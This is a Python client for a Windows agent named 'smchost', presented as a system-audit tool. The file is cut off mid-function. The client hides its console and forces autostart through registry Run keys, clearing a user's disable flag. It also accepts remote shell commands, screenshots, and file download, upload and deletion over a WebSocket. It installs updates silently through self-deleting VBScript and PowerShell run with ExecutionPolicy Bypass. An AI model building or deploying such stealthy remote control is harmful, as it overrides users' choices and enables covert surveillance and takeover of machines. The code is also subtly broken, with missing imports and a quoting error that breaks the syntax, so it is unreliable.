import os
import sys
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass
import asyncio
import websockets
import socket
import json
import configparser
import platform
import hashlib
import psutil
from library import WindowsAuditor, load_config, save_config, setup_system_logger

# Khởi tạo logger hệ thống xoay vòng (tối đa 5MB x 3 bản backup)
logger = setup_system_logger("SM_Client", "client.log")
import threading
import time 

# --- Quản lý Autostart qua Registry ---
if platform.system() == "Windows":
    import winreg
    import ctypes
    from ctypes import wintypes

def hide_console():
    """Ẩn cửa sổ console trên Windows."""
    if platform.system() == "Windows":
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)

def manage_autostart():
    """Thiết lập Windows Registry để client tự động chạy cùng hệ thống (luôn force Enabled nếu là Admin, fallback HKCU nếu không có Admin)."""
    if platform.system() != "Windows":
        return

    # Xác định đường dẫn thực thi
    if getattr(sys, 'frozen', False):
        app_path = f'"{sys.executable}"'
    else:
        app_path = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'

    reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    approved_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
    app_name = "smchost"

    # 1. Thử ghi vào HKEY_LOCAL_MACHINE (áp dụng cho tất cả users)
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_ALL_ACCESS)
        try:
            winreg.DeleteValue(key, app_name)
        except FileNotFoundError:
            pass
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)

        try:
            approved_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, approved_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(approved_key, app_name)
            winreg.CloseKey(approved_key)
            print(f"[AUTOSTART] Force enabled (HKLM): Cleared disabled flag for '{app_name}'")
        except FileNotFoundError:
            pass
        except Exception:
            pass

        print(f"[AUTOSTART] Registry HKLM refreshed & registered: {app_path}")
        return
    except PermissionError:
        print("[AUTOSTART] Skipping HKLM update: Not running as Administrator. Trying HKCU fallback...")
    except Exception as e:
        print(f"[AUTOSTART] HKLM update failed: {e}. Trying HKCU fallback...")

    # 2. Fallback ghi vào HKEY_CURRENT_USER (áp dụng cho user hiện tại, không cần quyền Admin)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
        try:
            winreg.DeleteValue(key, app_name)
        except FileNotFoundError:
            pass
        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)

        try:
            approved_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, approved_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(approved_key, app_name)
            winreg.CloseKey(approved_key)
            print(f"[AUTOSTART] Force enabled (HKCU): Cleared disabled flag for '{app_name}'")
        except FileNotFoundError:
            pass
        except Exception:
            pass

        print(f"[AUTOSTART] Registry HKCU refreshed & registered: {app_path}")
    except Exception as e:
        print(f"[AUTOSTART] Error setting HKCU autostart: {e}")

# --- Các hàm helper không đổi ---
def get_machine_id():
    """Lấy ID duy nhất của máy, ưu tiên MachineGuid trên Windows."""
    if platform.system() == "Windows":
        try:
            auditor = WindowsAuditor._SystemIdAudit()
            details = auditor.get_details()
            guid = details.get("MachineGuid")
            if guid:
                return guid
        except Exception as e:
            print(f"[ID] Error using _SystemIdAudit, falling back. Error: {e}")
    
    unique_string = f"{socket.gethostname()}-{platform.node()}-{platform.system()}-{platform.machine()}"
    try:
        import netifaces
        for interface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_LINK in addrs:
                mac_addr = addrs[netifaces.AF_LINK][0]['addr']
                if mac_addr != "00:00:00:00:00:00":
                    unique_string += f"-{mac_addr}"
    except ImportError:
        pass
    return hashlib.sha256(unique_string.encode()).hexdigest()

def get_base_path():
    """Trả về thư mục chứa file .exe hoặc .py đang chạy"""
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)  # khi đã đóng gói .exe
    return os.path.dirname(os.path.abspath(__file__))  # khi chạy file .py

# Chuỗi cấu hình mặc định đã được mã hóa sẵn (ENC:...) chuẩn hóa từ cấu hình mẫu của Client.
# Khi chưa có config.ini, client ghi trực tiếp chuỗi này ra đĩa trong 0.001s,
# hoàn toàn không cần giải mã/mã hóa tốn thời gian hay phụ thuộc file mẫu bên ngoài.
DEFAULT_CLIENT_CONFIG_ENC = (
    "ENC:CD5IORMcX286QlkhOQ12RUAbAQA4VzAuSDgWJlldW1dYc3ANJhwmXldTR0Q2ElkkDhxDbQEABVk7SDkWEEJcEA8WYX0ffUtK"
    "HAMAHAdnfRpBBhVEV15GaSUoXzgMFkMSDRIEY38bZVZIHAIeAwJjeidBPhpBW1VcQg5HXi4XD0hAEA8WYn8aZVVXHRwBOEQ2OV8y"
    "OhBDRlVAQDIhDXZFSB04QldQNj5FFAwXWVdCRFc/bRBrUHNYQlRTQjYSRCUDFnJbXkZTITtMJ0VEDQQAOFsyNXIuExxDRm9eWTRt"
    "EGtXTCdaWUFCPD9UFAkQQFtEEgtzfxhBExxfQVldWHNwDXlVSxscAwMHY2Mcf1VOJzhrU0M3JFkUCBZJR1xXRQ5HTjsQWRASAThE"
    "MiANdkVIJ1ZZQV1zcA16bx5dRxAPFmJHQCoMF09dUUBSc3ANem8XSEZHXUQ4bRBrVHNdQFlcQjY/XmtYWRw4X0EWbm0cQRYAXkZV"
    "X2k6KQ12RUgnV0ZXWCcSQSQCWRASAThDIChfOEVEDQM6UUQ2KUglERBMXkMSC3N8JzgAC1tbU1dFc3ANem8KWVNCRkMjbRBrVHNe"
    "XVZGQTI/SGtYWRw4QEBZMCheOAAKDQ8QAzwkKE8UDRBeRl9AT3NwDXpvFEJcWUZZIW0Qa1RzTl1eXFMwOUQkCwoNDxADPFk="
)

def ensure_default_config(config_path):
    """
    Tự động khởi tạo file config mặc định nếu chưa tồn tại hoặc bị rỗng.
    Sử dụng chuỗi cấu hình đã mã hóa sẵn của Client để ghi trực tiếp,
    tránh hoàn toàn lỗi KeyError khi client khởi động mà không có sẵn file config.ini.
    """
    try:
        if not os.path.exists(config_path) or os.path.getsize(config_path) == 0:
            print(f"[CONFIG] '{config_path}' not found or empty. Generating default encrypted client configuration...")
            target_dir = os.path.dirname(os.path.abspath(config_path))
            if target_dir:
                os.makedirs(target_dir, exist_ok=True)
            with open(config_path, "w", encoding="utf-8") as f:
                f.write(DEFAULT_CLIENT_CONFIG_ENC)
            print(f"[CONFIG] Default client configuration initialized successfully at '{config_path}'.")
    except Exception as e:
        print(f"[CONFIG] Error generating default configuration file: {e}")

def load_config_file(config_path):
    ensure_default_config(config_path)
    return load_config(config_path)

def get_enabled_modules_from_config():
    """Đọc config và trả về danh sách các module audit được bật."""
    base_path = get_base_path()
    config_path = os.path.join(base_path, "config.ini")

    config = load_config_file(config_path)

    enabled_modules = []
    if 'audit_modules' in config:
        for module_name, is_enabled in config['audit_modules'].items():
            if config.getboolean('audit_modules', module_name):
                enabled_modules.append(module_name)
    return enabled_modules

def ensure_single_instance():
    """Kiểm tra và tắt triệt để các bản client cũ đang chạy."""
    current_pid = os.getpid()
    exe_name = os.path.basename(sys.executable)
    
    print(f"[CLEANUP] Checking for existing instances of '{exe_name}'...")
    
    found_other = False
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            if proc.info['pid'] == current_pid:
                continue
            
            is_same_app = False
            if proc.info['name'] == exe_name:
                is_same_app = True
            elif proc.info['exe'] and os.path.normpath(proc.info['exe']) == os.path.normpath(sys.executable):
                is_same_app = True
                
            if is_same_app:
                print(f"[CLEANUP] Found existing instance (PID: {proc.info['pid']}). Terminating...")
                p = psutil.Process(proc.info['pid'])
                try:
                    p.terminate()
                    p.wait(timeout=3)
                except psutil.TimeoutExpired:
                    print(f"[CLEANUP] PID {proc.info['pid']} did not respond to terminate. Killing...")
                    p.kill()
                
                print(f"[CLEANUP] PID {proc.info['pid']} cleaned up.")
                found_other = True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.TimeoutExpired):
            continue
            
    if not found_other:
        print("[CLEANUP] No other instances found.")

# --- Các biến toàn cục và Phiên bản Client (cố định trong code, cập nhật qua build.bat) ---
__version__ = "26.1106.2125"
CLIENT_VERSION = __version__
CLIENT_GUID = get_machine_id()

def get_client_version(config_obj=None):
    """Lấy phiên bản client (được cố định trong mã nguồn code)."""
    return CLIENT_VERSION

HOSTNAME = socket.gethostname()
USERNAME = HOSTNAME

from concurrent.futures import ThreadPoolExecutor, as_completed

# --- Logic Audit được viết lại ---

def run_full_audit_sync():
    """
    Chạy các module audit được cấu hình trong config.ini bằng ThreadPoolExecutor.
    Mỗi module có timeout để tránh treo toàn bộ client.
    """
    print("\n[AUDIT] Starting configured system audit with timeout protection...")
    start_time = time.time()
    
    if platform.system() != "Windows":
        print("[AUDIT] Skipping audit: Library is for Windows only.")
        return {"Error": "Audit library is for Windows only."}
    
    enabled_modules = get_enabled_modules_from_config()
    if not enabled_modules:
        print("[AUDIT] No audit modules enabled in config.ini. Skipping audit.")
        return {"Info": "No audit modules enabled."}

    print(f"[AUDIT] Enabled modules: {', '.join(enabled_modules)}")

    base_path = get_base_path()
    config_path = os.path.join(base_path, "config.ini")
    config = load_config_file(config_path)

    max_event_log = config.getint('client', 'max_event_log', fallback=25)
    history_limit = config.getint('client', 'history_limit', fallback=100)
    # Timeout mặc định cho mỗi module là 30 giây
    module_timeout = config.getint('client', 'module_timeout', fallback=30)

    auditor = WindowsAuditor(max_events=max_event_log, history_limit_per_profile=history_limit)
    all_results = {}

    # Sử dụng ThreadPoolExecutor để chạy các module song song (giảm tổng thời gian audit)
    # Tuy nhiên để tránh spike CPU, ta có thể giới hạn max_workers
    with ThreadPoolExecutor(max_workers=4) as executor:
        future_to_module = {
            executor.submit(auditor.auditors[name].get_details): name 
            for name in enabled_modules if name in auditor.auditors
        }
        
        for future in as_completed(future_to_module):
            name = future_to_module[future]
            try:
                # Chờ kết quả với timeout
                result = future.result(timeout=module_timeout)
                all_results[name] = result
                print(f"[AUDIT] Module '{name}' completed.")
            except TimeoutError:
                print(f"[AUDIT] Module '{name}' timed out after {module_timeout}s.")
                all_results[name] = {"Error": f"Audit module '{name}' timed out."}
            except Exception as e:
                print(f"[AUDIT] Module '{name}' failed: {e}")
                all_results[name] = {"Error": f"Audit module '{name}' failed: {e}"}
    
    end_time = time.time()
    print(f"[AUDIT] Configured system audit completed in {end_time - start_time:.2f} seconds.")
    return all_results

# --- Các tác vụ gửi tin được viết lại ---

# FILE: client.py

terminal_process = None
main_event_loop = None

async def _safe_close_ws(ws):
    if ws is None:
        return
    try:
        if hasattr(ws, 'close'):
            res = ws.close(code=1000, reason="Client normal exit")
            if asyncio.iscoroutine(res):
                await res
    except Exception as e:
        print(f"[RECONNECT] Warning closing websocket: {e}")

def execute_graceful_shutdown(ws, delay_before_exit=1.2):
    """
    Thực hiện ngắt kết nối an toàn (Graceful Shutdown) trước khi tiến trình update thay thế:
    1. Gửi Close frame WebSocket chuẩn (code 1000 - Normal Closure) để server không báo lỗi 1006.
    2. Flush toàn bộ stream stdout, stderr.
    3. Dừng event loop nếu đang chạy.
    4. Thoát tiến trình có kiểm soát bằng sys.exit(0).
    """
    global main_event_loop
    print("[SHUTDOWN] Bắt đầu quy trình tắt máy trạm an toàn (Graceful Shutdown)...")
    try:
        if ws and main_event_loop and main_event_loop.is_running():
            asyncio.run_coroutine_threadsafe(
                _safe_close_ws(ws),
                main_event_loop
            )
    except Exception as e:
        print(f"[SHUTDOWN] Lỗi khi đóng websocket: {e}")

    try:
        sys.stdout.flush()
        sys.stderr.flush()
    except Exception:
        pass

    time.sleep(delay_before_exit)
    try:
        if main_event_loop and main_event_loop.is_running():
            main_event_loop.call_soon_threadsafe(main_event_loop.stop)
    except Exception:
        pass

    try:
        sys.exit(0)
    except SystemExit:
        os._exit(0)

# Trạng thái theo dõi tiến trình tải bản cập nhật dạng Chunk
chunk_download_state = {
    "active": False,
    "file_path": None,
    "final_path": None,
    "expected_sha256": None,
    "filename": None,
    "installer_type": None,
    "total_chunks": 0,
    "received_chunks": 0,
    "file_handle": None
}

def run_silent_updater_and_exit(final_path, installer_type, ws):
    """Kích hoạt VBScript chạy ngầm cài đặt và thực hiện shutdown an toàn."""
    temp_dir = os.path.dirname(os.path.abspath(final_path))
    wscript_exe = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "wscript.exe")
    if not os.path.exists(wscript_exe):
        wscript_exe = "wscript.exe"
    flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0) | getattr(subprocess, 'DETACHED_PROCESS', 0x00000008)
    current_pid = str(os.getpid())

    if installer_type == 'setup_exe':
        local_vbs = os.path.join(temp_dir, "silent_updater.vbs")
        vbs_content = (
            'Set WshShell = CreateObject("WScript.Shell")\n'
            'WScript.Sleep 2000\n'
            'On Error Resume Next\n'
            'WshShell.Run "taskkill /F /PID " & WScript.Arguments(0), 0, True\n'
            'WshShell.Run "taskkill /F /IM smchost.exe", 0, True\n'
            'WScript.Sleep 1000\n'
            'WshShell.Run Chr(34) & WScript.Arguments(1) & Chr(34), 0, False\n'
            'Set fso = CreateObject("Scripting.FileSystemObject")\n'
            'fso.DeleteFile WScript.ScriptFullName, True\n'
        )
        try:
            with open(local_vbs, 'w', encoding='utf-8') as f:
                f.write(vbs_content)
        except Exception as e:
            print(f"[UPDATE ERROR] Ghi silent_updater.vbs thất bại: {e}")

        print(f"[UPDATE] Kích hoạt silent_updater.vbs ngầm (SW_HIDE, không hiện CMD)...")
        subprocess.Popen([wscript_exe, "//B", "//Nologo", local_vbs, current_pid, final_path],
                         creationflags=flags, close_fds=True)
        execute_graceful_shutdown(ws, delay_before_exit=1.2)
    else:
        local_vbs = os.path.join(temp_dir, "silent_updater_zip.vbs")
        extract_dir = os.path.join(temp_dir, "extracted")
        vbs_content = (
            'Set WshShell = CreateObject("WScript.Shell")\n'
            'WScript.Sleep 2000\n'
            'On Error Resume Next\n'
            'WshShell.Run "taskkill /F /PID " & WScript.Arguments(0), 0, True\n'
            'WshShell.Run "taskkill /F /IM smchost.exe", 0, True\n'
            'WScript.Sleep 1000\n'
            f'zipFile = "{final_path}"\n'
            f'destDir = "{extract_dir}"\n'
            'psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""Expand-Archive -Path \'" & zipFile & "\' -DestinationPath \'" & destDir & "\' -Force"""\n'
            'WshShell.Run psCmd, 0, True\n'
            'Set fso = CreateObject("Scripting.FileSystemObject")\n'
            'setupExe = destDir & "\\client_setup.exe"\n'
            'If fso.FileExists(setupExe) Then\n'
            '    WshShell.Run Chr(34) & setupExe & Chr(34), 0, False\n'
            'Else\n'
            '    targetDir = WScript.Arguments(1)\n'
            '    copyCmd = "cmd.exe /c xcopy /E /Y /H /R """ & destDir & "\\*"" """ & targetDir & "\\"""\n'
            '    WshShell.Run copyCmd, 0, True\n'
            '    WshShell.Run Chr(34) & targetDir & "\\smchost.exe" & Chr(34), 0, False\n'
            'End If\n'
            'fso.DeleteFile WScript.ScriptFullName, True\n'
        )
        try:
            with open(local_vbs, 'w', encoding='utf-8') as f:
                f.write(vbs_content)
        except Exception as e:
            print(f"[UPDATE ERROR] Ghi silent_updater_zip.vbs thất bại: {e}")

        current_dir = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
        print(f"[UPDATE] Kích hoạt silent_updater_zip.vbs ngầm (SW_HIDE, không hiện CMD)...")
        subprocess.Popen([wscript_exe, "//B", "//Nologo", local_vbs, current_pid, current_dir],
                         creationflags=flags, close_fds=True)
        execute_graceful_shutdown(ws, delay_before_exit=1.2)

async def listen_for_remote_commands(websocket):
    """Lắng nghe các lệnh điều khiển từ xa từ server."""
    global terminal_process
    try:
        async for message in websocket:
            try:
                data = json.loads(message)
                if data.get('type') == 'remote_command':
                    command_type = data.get('command')
                    print(f"[REMOTE] Received command: {command_type}")

                    response_data = {"type": "remote_response", "command": command_type, "guid": CLIENT_GUID}

                    import base64
                    import ctypes
                    import threading
                    import subprocess
                    import asyncio

                    if command_type == 'terminal':
                        cmd = data.get('payload', '')
                        shell = data.get('shell', 'cmd')
                        result = WindowsAuditor._RemoteControl.execute_command(cmd, shell)
                        response_data["result"] = result
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'process_list':
                        response_data["result"] = WindowsAuditor._RemoteControl.get_process_list()
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'kill_process':
                        pid = data.get('payload')
                        success = WindowsAuditor._RemoteControl.kill_process(int(pid))
                        response_data["result"] = {"success": success}
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'screenshot':
                        img_b64 = WindowsAuditor._RemoteControl.take_screenshot()
                        response_data["result"] = {"image": img_b64}
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'file_browse':
                        path = data.get('payload', '')
                        response_data["result"] = WindowsAuditor._RemoteControl.list_dir(path)
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'update_client_chunk_start':
                        global chunk_download_state
                        payload = data.get('payload', {})
                        filename = payload.get('filename', 'client_setup.exe')
                        total_chunks = payload.get('total_chunks', 0)
                        expected_sha256 = payload.get('sha256', '').strip().lower()
                        installer_type = payload.get('installer_type', 'setup_exe')

                        temp_dir = os.path.join(tempfile.gettempdir(), "sm_updater")
                        os.makedirs(temp_dir, exist_ok=True)
                        part_file = os.path.join(temp_dir, filename + ".part")
                        final_file = os.path.join(temp_dir, filename)

                        # Đóng file handle cũ nếu còn sót
                        if chunk_download_state.get("file_handle"):
                            try:
                                chunk_download_state["file_handle"].close()
                            except Exception:
                                pass

                        try:
                            fh = open(part_file, 'wb')
                            chunk_download_state = {
                                "active": True,
                                "file_path": part_file,
                                "final_path": final_file,
                                "expected_sha256": expected_sha256,
                                "filename": filename,
                                "installer_type": installer_type,
                                "total_chunks": total_chunks,
                                "received_chunks": 0,
                                "file_handle": fh
                            }
                            print(f"[UPDATE CHUNK] Bắt đầu nhận file cập nhật '{filename}' ({total_chunks} chunks, SHA256: {expected_sha256[:12]}...)...")
                            response_data["result"] = {"status": "chunk_download_started", "total_chunks": total_chunks}
                        except Exception as e:
                            print(f"[UPDATE CHUNK ERROR] Không thể mở file tạm: {e}")
                            response_data["result"] = {"success": False, "error": str(e)}
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'update_client_chunk_data':
                        if chunk_download_state["active"] and chunk_download_state.get("file_handle"):
                            payload = data.get('payload', {})
                            chunk_idx = payload.get('chunk_index', 0)
                            data_b64 = payload.get('data_b64', '')
                            try:
                                chunk_bytes = base64.b64decode(data_b64)
                                chunk_download_state["file_handle"].write(chunk_bytes)
                                chunk_download_state["received_chunks"] += 1
                                if chunk_idx % 15 == 0 or chunk_idx == chunk_download_state["total_chunks"] - 1:
                                    print(f"[UPDATE CHUNK] Nhận chunk {chunk_idx + 1}/{chunk_download_state['total_chunks']}")
                            except Exception as e:
                                print(f"[UPDATE CHUNK ERROR] Lỗi ghi chunk {chunk_idx}: {e}")

                    elif command_type == 'update_client_chunk_end':
                        if chunk_download_state["active"]:
                            if chunk_download_state.get("file_handle"):
                                try:
                                    chunk_download_state["file_handle"].close()
                                except Exception:
                                    pass
                                chunk_download_state["file_handle"] = None

                            part_file = chunk_download_state["file_path"]
                            final_path = chunk_download_state["final_path"]
                            expected_sha256 = chunk_download_state["expected_sha256"]
                            installer_type = chunk_download_state["installer_type"]
                            filename = chunk_download_state["filename"]

                            # Xác thực SHA256 của file hoàn chỉnh trên đĩa
                            hasher = hashlib.sha256()
                            try:
                                with open(part_file, 'rb') as f:
                                    while True:
                                        b = f.read(256 * 1024)
                                        if not b:
                                            break
                                        hasher.update(b)
                                actual_sha256 = hasher.hexdigest().lower()
                            except Exception as e:
                                print(f"[UPDATE CHUNK ERROR] Lỗi đọc file part: {e}")
                                response_data["result"] = {"success": False, "error": str(e)}
                                await websocket.send(json.dumps(response_data))
                                chunk_download_state["active"] = False
                                continue

                            if expected_sha256 and actual_sha256 != expected_sha256:
                                print(f"[UPDATE CHUNK ERROR] SHA256 không khớp! Nhận: {actual_sha256}, Kỳ vọng: {expected_sha256}")
                                try:
                                    os.remove(part_file)
                                except Exception:
                                    pass
                                response_data["result"] = {"success": False, "error": "SHA256 checksum mismatch"}
                                await websocket.send(json.dumps(response_data))
                                chunk_download_state["active"] = False
                                continue

                            # Đổi tên .part sang file đích
                            try:
                                if os.path.exists(final_path):
                                    os.remove(final_path)
                                os.rename(part_file, final_path)
                            except Exception as e:
                                print(f"[UPDATE CHUNK ERROR] Lỗi đổi tên file: {e}")
                                response_data["result"] = {"success": False, "error": str(e)}
                                await websocket.send(json.dumps(response_data))
                                chunk_download_state["active"] = False
                                continue

                            print(f"[UPDATE CHUNK] File '{filename}' nhận đủ 100% và xác thực SHA256 thành công ({actual_sha256[:12]}...). Kích hoạt cài đặt...")
                            response_data["result"] = {"status": "starting", "message": f"Tệp {filename} đã nhận đủ và xác thực toàn vẹn. Đang tiến hành cài đặt ngầm..."}
                            await websocket.send(json.dumps(response_data))

                            threading.Thread(target=run_silent_updater_and_exit, args=(final_path, installer_type, websocket), daemon=True).start()
                            chunk_download_state["active"] = False

                    elif command_type in ('update_client', 'update_client_push'):
                        payload = data.get('payload', {})
                        exe_b64 = payload.get('exe_b64', '')
                        zip_b64 = payload.get('zip_b64', '')
                        expected_sha256 = payload.get('sha256', '').strip().lower()
                        bat_content = payload.get('bat_content', '')

                        if not exe_b64 and not zip_b64:
                            print("[UPDATE ERROR] Nhận lệnh update nhưng dữ liệu payload trống!")
                            response_data["result"] = {"success": False, "error": "Empty update payload"}
                            await websocket.send(json.dumps(response_data))
                            continue

                        print(f"[UPDATE] Nhận gói cập nhật trực tiếp qua WebSocket (b64 length: {len(exe_b64 or zip_b64)}). Đang tiến hành cài đặt...")
                        response_data["result"] = {"status": "starting", "message": "Gói cài đặt client_setup.exe đã nhận. Đang tiến hành cài đặt..."}
                        await websocket.send(json.dumps(response_data))

                        def deploy_update_package():
                            import base64
                            import hashlib
                            import tempfile
                            import os
                            import subprocess
                            import sys
                            import time

                            temp_dir = os.path.join(tempfile.gettempdir(), "sm_updater")
                            os.makedirs(temp_dir, exist_ok=True)

                            # 1. ƯU TIÊN: CẬP NHẬT QUA client_setup.exe (chạy ẩn 100% không hiện CMD)
                            if exe_b64:
                                local_exe = os.path.join(temp_dir, "client_setup.exe")
                                local_vbs = os.path.join(temp_dir, "silent_updater.vbs")

                                print(f"[UPDATE] Giải mã và xác thực file cài đặt: {local_exe}")
                                try:
                                    exe_bytes = base64.b64decode(exe_b64)
                                    if expected_sha256:
                                        actual_sha256 = hashlib.sha256(exe_bytes).hexdigest().lower()
                                        if actual_sha256 != expected_sha256:
                                            print(f"[UPDATE ERROR] Checksum SHA256 không khớp! Nhận: {actual_sha256}, Kỳ vọng: {expected_sha256}")
                                            return
                                        print(f"[UPDATE] Xác thực toàn vẹn SHA256 thành công ({actual_sha256[:12]}...).")

                                    with open(local_exe, 'wb') as f:
                                        f.write(exe_bytes)
                                    print(f"[UPDATE] Ghi client_setup.exe thành công ({len(exe_bytes)} bytes)")
                                except Exception as e:
                                    print(f"[UPDATE ERROR] Ghi client_setup.exe thất bại: {e}")
                                    return

                                # Tạo script silent_updater.vbs: Chạy hoàn toàn ẩn ngầm (SW_HIDE = 0), không mở CMD
                                vbs_content = (
                                    'Set WshShell = CreateObject("WScript.Shell")\n'
                                    'WScript.Sleep 2000\n'
                                    'On Error Resume Next\n'
                                    'WshShell.Run "taskkill /F /PID " & WScript.Arguments(0), 0, True\n'
                                    'WshShell.Run "taskkill /F /IM smchost.exe", 0, True\n'
                                    'WScript.Sleep 1000\n'
                                    'WshShell.Run Chr(34) & WScript.Arguments(1) & Chr(34), 0, False\n'
                                    'Set fso = CreateObject("Scripting.FileSystemObject")\n'
                                    'fso.DeleteFile WScript.ScriptFullName, True\n'
                                )
                                try:
                                    with open(local_vbs, 'w', encoding='utf-8') as f:
                                        f.write(vbs_content)
                                except Exception as e:
                                    print(f"[UPDATE ERROR] Ghi silent_updater.vbs thất bại: {e}")

                                current_pid = str(os.getpid())
                                print(f"[UPDATE] Kích hoạt silent_updater.vbs ngầm (SW_HIDE, không hiện CMD)...")
                                wscript_exe = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "wscript.exe")
                                if not os.path.exists(wscript_exe):
                                    wscript_exe = "wscript.exe"

                                flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0) | getattr(subprocess, 'DETACHED_PROCESS', 0x00000008)
                                subprocess.Popen([wscript_exe, "//B", "//Nologo", local_vbs, current_pid, local_exe],
                                                 creationflags=flags, close_fds=True)

                                execute_graceful_shutdown(websocket, delay_before_exit=1.2)

                            # 2. DỰ PHÒNG: CẬP NHẬT QUA data.zip (chạy ẩn ngầm 100% không hiện CMD)
                            elif zip_b64:
                                local_zip = os.path.join(temp_dir, "data.zip")
                                local_vbs = os.path.join(temp_dir, "silent_updater_zip.vbs")
                                extract_dir = os.path.join(temp_dir, "extracted")

                                print(f"[UPDATE] Giải mã và xác thực file zip: {local_zip}")
                                try:
                                    zip_bytes = base64.b64decode(zip_b64)
                                    if expected_sha256:
                                        actual_sha256 = hashlib.sha256(zip_bytes).hexdigest().lower()
                                        if actual_sha256 != expected_sha256:
                                            print(f"[UPDATE ERROR] Checksum SHA256 zip không khớp! Nhận: {actual_sha256}, Kỳ vọng: {expected_sha256}")
                                            return
                                        print(f"[UPDATE] Xác thực toàn vẹn SHA256 thành công ({actual_sha256[:12]}...).")

                                    with open(local_zip, 'wb') as f:
                                        f.write(zip_bytes)
                                except Exception as e:
                                    print(f"[UPDATE ERROR] Ghi data.zip thất bại: {e}")
                                    return

                                vbs_content = (
                                    'Set WshShell = CreateObject("WScript.Shell")\n'
                                    'WScript.Sleep 2000\n'
                                    'On Error Resume Next\n'
                                    'WshShell.Run "taskkill /F /PID " & WScript.Arguments(0), 0, True\n'
                                    'WshShell.Run "taskkill /F /IM smchost.exe", 0, True\n'
                                    'WScript.Sleep 1000\n'
                                    f'zipFile = "{local_zip}"\n'
                                    f'destDir = "{extract_dir}"\n'
                                    'psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -Command ""Expand-Archive -Path '" & zipFile & "' -DestinationPath '" & destDir & "' -Force"""\n'
                                    'WshShell.Run psCmd, 0, True\n'
                                    'Set fso = CreateObject("Scripting.FileSystemObject")\n'
                                    'setupExe = destDir & "\\client_setup.exe"\n'
                                    'If fso.FileExists(setupExe) Then\n'
                                    '    WshShell.Run Chr(34) & setupExe & Chr(34), 0, False\n'
                                    'Else\n'
                                    '    targetDir = WScript.Arguments(1)\n'
                                    '    copyCmd = "cmd.exe /c xcopy /E /Y /H /R """ & destDir & "\\*"" """ & targetDir & "\\"""\n'
                                    '    WshShell.Run copyCmd, 0, True\n'
                                    '    WshShell.Run Chr(34) & targetDir & "\\smchost.exe" & Chr(34), 0, False\n'
                                    'End If\n'
                                    'fso.DeleteFile WScript.ScriptFullName, True\n'
                                )
                                try:
                                    with open(local_vbs, 'w', encoding='utf-8') as f:
                                        f.write(vbs_content)
                                except Exception as e:
                                    print(f"[UPDATE ERROR] Ghi silent_updater_zip.vbs thất bại: {e}")

                                current_pid = str(os.getpid())
                                current_dir = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
                                wscript_exe = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "wscript.exe")
                                if not os.path.exists(wscript_exe):
                                    wscript_exe = "wscript.exe"

                                flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0) | getattr(subprocess, 'DETACHED_PROCESS', 0x00000008)
                                subprocess.Popen([wscript_exe, "//B", "//Nologo", local_vbs, current_pid, current_dir],
                                                 creationflags=flags, close_fds=True)

                                execute_graceful_shutdown(websocket, delay_before_exit=1.2)
                        threading.Thread(target=deploy_update_package, daemon=True).start()

                    elif command_type == 'file_download':
                        filepath = data.get('payload', '')
                        result = WindowsAuditor._RemoteControl.download_file_or_folder(filepath)
                        response_data["result"] = result
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'file_upload':
                        payload = data.get('payload', {})
                        filepath = payload.get('path', '')
                        b64_content = payload.get('content', '')
                        result = WindowsAuditor._RemoteControl.upload_file(filepath, b64_content)
                        response_data["result"] = result
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'file_delete':
                        filepath = data.get('payload', '')
                        result = WindowsAuditor._RemoteControl.delete_path(filepath)
                        response_data["result"] = result
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'create_folder':
                        folderpath = data.get('payload', '')
                        result = WindowsAuditor._RemoteControl.create_dir(folderpath)
                        response_data["result"] = result
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'message_box':
                        message_text = data.get('payload', '')
                        try:
                            def show_msg():
                                ctypes.windll.user32.MessageBoxW(0, message_text, "Message from Administrator", 0x40 | 0x0)
                            threading.Thread(target=show_msg, daemon=True).start()
                            response_data["result"] = {"success": True}
                        except Exception as e:
                            response_data["result"] = {"success": False, "error": str(e)}
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'terminal_start':
                        if terminal_process and terminal_process.poll() is None:
                            try: terminal_process.terminate()
                            except: pass
                        shell = data.get('payload', 'cmd.exe')
                        flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
                        try:
